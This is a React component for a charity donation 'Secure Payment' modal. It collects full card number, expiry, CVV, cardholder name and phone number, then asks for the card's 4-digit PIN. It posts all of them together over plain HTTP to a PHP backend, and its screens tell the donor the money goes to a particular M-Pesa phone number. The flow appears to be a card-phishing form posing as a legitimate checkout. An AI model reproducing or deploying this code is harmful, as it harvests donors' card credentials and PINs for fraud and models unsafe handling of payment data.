"use client"
import type React from "react"
import { useState } from "react"
import { X, CreditCard, Lock, Phone, AlertCircle, CheckCircle } from "lucide-react"

interface PaymentModalProps {
  isOpen: boolean
  onClose: () => void
  donationData: {
    donation_id: number
    amount: number
    cause: string
    donor_name: string
    donor_email: string
  }
  onPaymentSuccess: (result: any) => void
}

interface PaymentData {
  card_number: string
  expiry_month: string
  expiry_year: string
  cvv: string
  cardholder_name: string
  phone_number: string
}

const PaymentModal: React.FC<PaymentModalProps> = ({ isOpen, onClose, donationData, onPaymentSuccess }) => {
  const [paymentData, setPaymentData] = useState<PaymentData>({
    card_number: "",
    expiry_month: "",
    expiry_year: "",
    cvv: "",
    cardholder_name: "",
    phone_number: "",
  })
  const [isProcessing, setIsProcessing] = useState(false)
  const [error, setError] = useState("")
  const [step, setStep] = useState<"card_details" | "pin_verification" | "processing" | "success">("card_details")
  const [pinCode, setPinCode] = useState("")

  if (!isOpen) return null

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(" ")
    } else {
      return v
    }
  }

  const getCardBrand = (number: string) => {
    const num = number.replace(/\D/g, "")
    if (num.startsWith("4")) return "Visa"
    if (
      num.startsWith("5") ||
      (num.length >= 2 && Number.parseInt(num.substring(0, 2)) >= 51 && Number.parseInt(num.substring(0, 2)) <= 55)
    )
      return "Mastercard"
    if (num.startsWith("34") || num.startsWith("37")) return "American Express"
    return "Unknown"
  }

  const validateCardNumber = (number: string) => {
    const num = number.replace(/\D/g, "")
    if (num.length < 13 || num.length > 19) return false

    let sum = 0
    let alternate = false

    for (let i = num.length - 1; i >= 0; i--) {
      let digit = Number.parseInt(num.charAt(i))

      if (alternate) {
        digit *= 2
        if (digit > 9) {
          digit = (digit % 10) + 1
        }
      }

      sum += digit
      alternate = !alternate
    }

    return sum % 10 === 0
  }

  const handleInputChange = (field: keyof PaymentData, value: string) => {
    if (field === "card_number") {
      value = formatCardNumber(value)
    }
    if (field === "phone_number") {
      value = value.replace(/[^0-9+]/g, "")
    }
    if (field === "cvv") {
      value = value.replace(/[^0-9]/g, "").substring(0, 4)
    }
    if (field === "expiry_month") {
      value = value.replace(/[^0-9]/g, "").substring(0, 2)
      if (Number.parseInt(value) > 12) value = "12"
    }
    if (field === "expiry_year") {
      value = value.replace(/[^0-9]/g, "").substring(0, 4)
    }

    setPaymentData((prev) => ({ ...prev, [field]: value }))
  }

  const validateForm = () => {
    const { card_number, expiry_month, expiry_year, cvv, cardholder_name, phone_number } = paymentData

    if (!validateCardNumber(card_number)) {
      setError("Invalid card number")
      return false
    }

    if (!expiry_month || !expiry_year) {
      setError("Please enter expiry date")
      return false
    }

    const currentYear = new Date().getFullYear()
    const currentMonth = new Date().getMonth() + 1
    const expYear = Number.parseInt(expiry_year)
    const expMonth = Number.parseInt(expiry_month)

    if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
      setError("Card has expired")
      return false
    }

    if (cvv.length < 3) {
      setError("Invalid CVV")
      return false
    }

    if (!cardholder_name.trim()) {
      setError("Please enter cardholder name")
      return false
    }

    if (phone_number.replace(/\D/g, "").length < 10) {
      setError("Please enter a valid phone number")
      return false
    }

    return true
  }

  const handleSubmitPayment = async () => {
    setError("")

    if (!validateForm()) return

    setStep("pin_verification")
  }

  const handlePinSubmit = async () => {
    if (pinCode.length !== 4) {
      setError("Please enter your 4-digit PIN")
      return
    }

    setStep("processing")
    setIsProcessing(true)

    try {
      const response = await fetch("http://localhost/bullione-latest/bullione-backend/api/process-payment.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          donation_id: donationData.donation_id,
          amount: donationData.amount,
          card_number: paymentData.card_number.replace(/\s/g, ""),
          expiry_month: paymentData.expiry_month,
          expiry_year: paymentData.expiry_year,
          cvv: paymentData.cvv,
          cardholder_name: paymentData.cardholder_name,
          phone_number: paymentData.phone_number,
          pin: pinCode,
        }),
      })

      const result = await response.json()

      if (result.success) {
        setStep("success")
        setTimeout(() => {
          onPaymentSuccess(result)
          onClose()
        }, 3000)
      } else {
        setError(result.error || "Payment failed. Please try again.")
        setStep("card_details")
      }
    } catch (err: any) {
      setError(`Network error: ${err.message}`)
      setStep("card_details")
    } finally {
      setIsProcessing(false)
    }
  }

  const renderCardDetailsStep = () => (
    <div className="space-y-6">
      <div className="text-center">
        <CreditCard className="w-12 h-12 text-blue-600 mx-auto mb-4" />
        <h3 className="text-xl font-semibold text-gray-900 mb-2">Payment Details</h3>
        <p className="text-gray-600">
          Donating ${donationData.amount} to {donationData.cause}
        </p>
      </div>

      {error && (
        <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg">
          <div className="flex items-center">
            <AlertCircle className="w-5 h-5 mr-2" />
            <span>{error}</span>
          </div>
        </div>
      )}

      <div className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">Card Number</label>
          <div className="relative">
            <input
              type="text"
              value={paymentData.card_number}
              onChange={(e) => handleInputChange("card_number", e.target.value)}
              className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              placeholder="1234 5678 9012 3456"
              maxLength={19}
            />
            <div className="absolute right-3 top-3 text-sm text-gray-500">{getCardBrand(paymentData.card_number)}</div>
          </div>
        </div>

        <div className="grid grid-cols-3 gap-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">Month</label>
            <input
              type="text"
              value={paymentData.expiry_month}
              onChange={(e) => handleInputChange("expiry_month", e.target.value)}
              className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              placeholder="MM"
              maxLength={2}
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">Year</label>
            <input
              type="text"
              value={paymentData.expiry_year}
              onChange={(e) => handleInputChange("expiry_year", e.target.value)}
              className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              placeholder="YYYY"
              maxLength={4}
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">CVV</label>
            <input
              type="text"
              value={paymentData.cvv}
              onChange={(e) => handleInputChange("cvv", e.target.value)}
              className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              placeholder="123"
              maxLength={4}
            />
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">Cardholder Name</label>
          <input
            type="text"
            value={paymentData.cardholder_name}
            onChange={(e) => handleInputChange("cardholder_name", e.target.value)}
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            placeholder="John Doe"
          />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
          <input
            type="text"
            value={paymentData.phone_number}
            onChange={(e) => handleInputChange("phone_number", e.target.value)}
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            placeholder="+254712345678"
          />
          <p className="text-xs text-gray-500 mt-1">PIN verification will be sent to this number</p>
        </div>
      </div>

      <div className="flex gap-4">
        <button
          onClick={onClose}
          className="flex-1 px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition duration-300"
        >
          Cancel
        </button>
        <button
          onClick={handleSubmitPayment}
          className="flex-1 px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition duration-300 flex items-center justify-center"
        >
          <Lock className="w-4 h-4 mr-2" />
          Continue to PIN
        </button>
      </div>
    </div>
  )

  const renderPinVerificationStep = () => (
    <div className="space-y-6">
      <div className="text-center">
        <Phone className="w-12 h-12 text-green-600 mx-auto mb-4" />
        <h3 className="text-xl font-semibold text-gray-900 mb-2">Enter Your PIN</h3>
        <p className="text-gray-600">A verification prompt has been sent to {paymentData.phone_number}</p>
        <p className="text-sm text-gray-500 mt-2">Please enter your 4-digit card PIN to complete the transaction</p>
      </div>

      {error && (
        <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg">
          <div className="flex items-center">
            <AlertCircle className="w-5 h-5 mr-2" />
            <span>{error}</span>
          </div>
        </div>
      )}

      <div className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">Card PIN</label>
          <input
            type="password"
            value={pinCode}
            onChange={(e) => setPinCode(e.target.value.replace(/[^0-9]/g, "").substring(0, 4))}
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent text-center text-2xl tracking-widest"
            placeholder="••••"
            maxLength={4}
          />
        </div>
      </div>

      <div className="flex gap-4">
        <button
          onClick={() => setStep("card_details")}
          className="flex-1 px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition duration-300"
        >
          Back
        </button>
        <button
          onClick={handlePinSubmit}
          disabled={pinCode.length !== 4}
          className="flex-1 px-6 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 transition duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Complete Payment
        </button>
      </div>
    </div>
  )

  const renderProcessingStep = () => (
    <div className="space-y-6 text-center">
      <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-blue-600 mx-auto"></div>
      <h3 className="text-xl font-semibold text-gray-900">Processing Payment...</h3>
      <p className="text-gray-600">Please wait while we process your donation of ${donationData.amount}</p>
      <div className="space-y-2 text-sm text-gray-500">
        <p>✓ Verifying card details</p>
        <p>✓ Processing payment</p>
        <p>⏳ Transferring to M-Pesa (+254112648637)</p>
      </div>
    </div>
  )

  const renderSuccessStep = () => (
    <div className="space-y-6 text-center">
      <CheckCircle className="w-16 h-16 text-green-600 mx-auto" />
      <h3 className="text-xl font-semibold text-gray-900">Payment Successful!</h3>
      <p className="text-gray-600">Your donation of ${donationData.amount} has been processed successfully</p>
      <div className="bg-green-50 border border-green-200 rounded-lg p-4">
        <p className="text-green-800 text-sm">Funds have been transferred to M-Pesa (+254112648637)</p>
      </div>
    </div>
  )

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-2xl max-w-md w-full max-h-[90vh] overflow-y-auto">
        <div className="p-6">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-2xl font-bold text-gray-900">Secure Payment</h2>
            <button
              onClick={onClose}
              className="text-gray-400 hover:text-gray-600 transition duration-300"
              disabled={isProcessing}
            >
              <X className="w-6 h-6" />
            </button>
          </div>

          {step === "card_details" && renderCardDetailsStep()}
          {step === "pin_verification" && renderPinVerificationStep()}
          {step === "processing" && renderProcessingStep()}
          {step === "success" && renderSuccessStep()}
        </div>
      </div>
    </div>
  )
}

export default PaymentModal
